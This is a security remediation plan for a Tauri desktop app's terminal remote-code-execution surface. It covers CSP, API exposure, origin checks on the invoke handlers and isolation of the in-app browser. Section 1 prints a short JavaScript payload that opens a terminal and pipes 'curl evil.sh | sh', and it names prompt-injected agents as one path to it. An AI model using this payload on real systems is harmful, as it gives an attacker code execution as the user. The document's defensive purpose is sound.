# Phase 5 — Desktop Shell + Terminal RCE Surface (Implementation Plan)

**Date:** 2026-05-30
**Status:** Plan only — no code written yet
**Severity:** RCE-class — recommend executing right after Phase 1 (see roadmap re-prioritization note).
**Context:** `05-30-26-security-notification-layer-research.md` §5d.

---

## 1. The problem (verified in source)
The Tauri shell combines three settings that together let any JavaScript running in the webview obtain a full shell:

1. **`tauri.conf.json` → `"security": {"csp": null}`** — no Content-Security-Policy on the webview. Any injected/loaded script executes freely.
2. **`tauri.conf.json` → `"withGlobalTauri": true`** — the Tauri API (incl. `invoke`) is exposed on `window.__TAURI__` to all page JS.
3. **`main.rs` registers `terminal_open/terminal_input/terminal_resize/terminal_close`**, and **`terminal.rs` spawns the user's `$SHELL`** in a PTY at `$HOME`. `assets/js/app.js` already drives these via `invoke("terminal_open", …)`.

**Attack:** stored-XSS in any LiveView, or the in-app browser/tab shell navigating to a hostile page rendered in the privileged webview, runs:
```js
const id = await window.__TAURI__.core.invoke("terminal_open", {cols:80, rows:24});
await window.__TAURI__.core.invoke("terminal_input", {id, data:"curl evil.sh | sh\n"});
```
→ **arbitrary code execution as the user.** The invoke handlers have no origin/trust scoping. This sits behind all the agent/ingest surfaces: a prompt-injected agent that can place content into a rendered view, or steer the in-app browser, gets a shell.

Aggravating: the window loads Phoenix over **plain HTTP on loopback**, and the "browser-style tab shell" can render arbitrary remote origins — the exact source of untrusted JS — with no documented isolation.

---

## 2. Objective
Make it impossible for untrusted web content to reach the `terminal_*` invoke handlers (or any privileged Tauri command), and isolate the in-app browser from the privileged app webview. Defense-in-depth: even if XSS exists in a LiveView, it must not yield a shell.

**Definition of done:**
- A restrictive **CSP** is enforced on the app webview (no inline/remote script beyond the bundled app + LiveView socket).
- `terminal_*` (and other sensitive) invoke handlers are **reachable only from the trusted app origin** — not from in-app-browser content.
- The in-app browser renders untrusted sites in an **isolated context with no Tauri API access**.
- A manual red-team check (try the `invoke("terminal_open")` payload from a loaded remote page) fails.

---

## 3. Design (layers — do all; each is independent defense)

### 3.1 Content-Security-Policy on the app webview
- Replace `"csp": null` with an explicit policy: `default-src 'self'`; `connect-src 'self' ws: http://127.0.0.1:*` (LiveView socket); `script-src 'self'` (no `'unsafe-inline'` — verify the esbuild bundle + LiveView don't require inline; if they do, use nonces/hashes); `frame-src` restricted; `object-src 'none'`; `base-uri 'self'`.
- Phoenix side: also set the matching CSP response header in `endpoint.ex`/`put_secure_browser_headers` (Phase 4 item — coordinate so the two don't conflict). Audit `app.js`/heex for inline scripts/handlers that a strict CSP would break.

### 3.2 Lock down the Tauri API exposure & capabilities
- **Reconsider `withGlobalTauri: true`.** Prefer `false` + explicit imports from `@tauri-apps/api` in the bundled frontend (already how `app.js` imports `invoke`). This removes the trivially-reachable `window.__TAURI__` global.
- Tighten `capabilities/default.json` (currently just `["core:default"]`): scope capabilities to the `main` window only, and avoid granting webview-creation / shell-ish permissions to any window that can host remote content. Enumerate what `core:default` actually grants and trim.

### 3.3 Origin-scope the sensitive invoke handlers (defense even if CSP fails)
- In `main.rs`/`terminal.rs`, gate `terminal_*` on the **calling webview's URL/label** — only allow when the request originates from the trusted app window/origin (e.g. check `Webview::url()` / window label), reject otherwise. Tauri 2 exposes the calling webview to commands; use it.
- Consider a per-session capability token minted by the app shell and required by `terminal_input`, so a foreign script can't drive an existing session even if it guesses an id.

### 3.4 Isolate the in-app browser
- Render untrusted/remote sites in a **separate webview or window** that:
  - does **not** have `withGlobalTauri` / Tauri API access (no invoke surface), and
  - uses its own capability set (none of the privileged commands), ideally a distinct partition/profile so cookies/state don't bleed into the app origin.
- If the tab shell currently renders remote content in the *same* webview as the LiveView app, that is the core fix — they must be different trust zones.

### 3.5 Transport
- Keep loopback, but document why HTTP-on-loopback is acceptable (no network exposure) or move to a localhost TLS cert; ensure CSP `connect-src` matches the chosen scheme/port (the release uses a random port — `main.rs` already injects it, so CSP must be generated/templated with that port or use `127.0.0.1:*`).

---

## 4. File-by-file change list
| File | Change | Risk |
|---|---|---|
| `desktop/tauri/tauri.conf.json` | set explicit `csp`; flip `withGlobalTauri` to `false` (if frontend audit passes) | Medium — can break the frontend if inline scripts exist |
| `desktop/tauri/capabilities/default.json` | scope to `main`; trim `core:default`; ensure no privileged caps on browser webview | Medium |
| `desktop/tauri/src/main.rs`, `terminal.rs` | origin/label check in `terminal_*`; optional session capability token | Medium |
| in-app browser impl (webview/window creation in `main.rs` + the tab-shell LiveView/JS) | isolate remote content into a non-privileged webview/partition | High — architectural |
| `assets/js/app.js`, heex templates | remove inline scripts/handlers for strict CSP; switch to module imports if `withGlobalTauri:false` | Medium |
| `lib/buster_claw_web/endpoint.ex` | matching CSP header (coordinate w/ Phase 4) | Low |
| `docs/LOCAL_TRUST.md` | document webview trust zones + terminal gating | Docs |

---

## 5. Test / verification plan
- **Red-team manual:** load a local test page that calls `invoke("terminal_open")` inside the in-app browser → must fail (no API / origin rejected). Repeat after each layer to prove independence.
- Confirm the legitimate Terminal tab still works (trusted origin path).
- CSP regression: app loads with no console CSP violations; LiveView socket connects; assets load.
- Rust unit/integration test for the `terminal_open` origin guard (allowed label vs. rejected label).
- Confirm in-app browser cannot read app cookies / localStorage (partition isolation).

---

## 6. Sequencing notes & open decisions
- **Coordinate the CSP** with Phase 4's header work so app-webview CSP (Tauri) and HTTP-response CSP (Phoenix) agree.
- **Order within phase:** 3.1 (CSP) + 3.2 (`withGlobalTauri`) are the cheapest, highest-leverage — do first; 3.3 (origin-scope handlers) is the strongest guarantee; 3.4 (browser isolation) is the largest lift.
- **Open Q1:** does the in-app browser today share the app webview or already use a separate one? (Determines whether 3.4 is a config change or a rebuild — needs a focused read of the tab-shell implementation before estimating.)
- **Open Q2:** is `withGlobalTauri: true` actually required by any current frontend code, or is it leftover scaffolding? (If unused, flipping it is nearly free.)
- **Open Q3:** acceptable to require a session capability token for `terminal_input` (3.3), or is origin-scoping alone sufficient?
